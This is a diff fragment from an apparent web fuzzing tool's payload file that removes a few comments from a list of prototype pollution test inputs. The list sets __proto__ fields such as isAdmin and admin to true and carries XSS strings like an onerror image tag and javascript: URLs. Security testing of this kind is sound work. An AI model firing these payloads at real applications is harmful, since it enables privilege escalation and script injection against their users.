@@ -232,16 +232,12 @@ window.FuzzingPayloads = {
     },
 
     PROTOTYPE_POLLUTION: [
-        // Basic __proto__
         { field: '__proto__.polluted_frog_1', value: true },
-        // Constructor prototype
         { field: 'constructor.prototype.polluted_frog_2', value: true },
-        // Common property names often used in checks or logic
         { field: '__proto__.isAdmin', value: true },
         { field: '__proto__.is_admin', value: true },
         { field: '__proto__.admin', value: true },
         { field: '__proto__.enabled', value: true },
-        // Additional prototype pollution vectors
         { field: '__proto__.innerHTML', value: '<img src=x onerror=alert(\"PP_XSS\")>' },
         { field: '__proto__.src', value: 'javascript:alert(\"PP_SRC\")' },
         { field: '__proto__.href', value: 'javascript:alert(\"PP_HREF\")' },
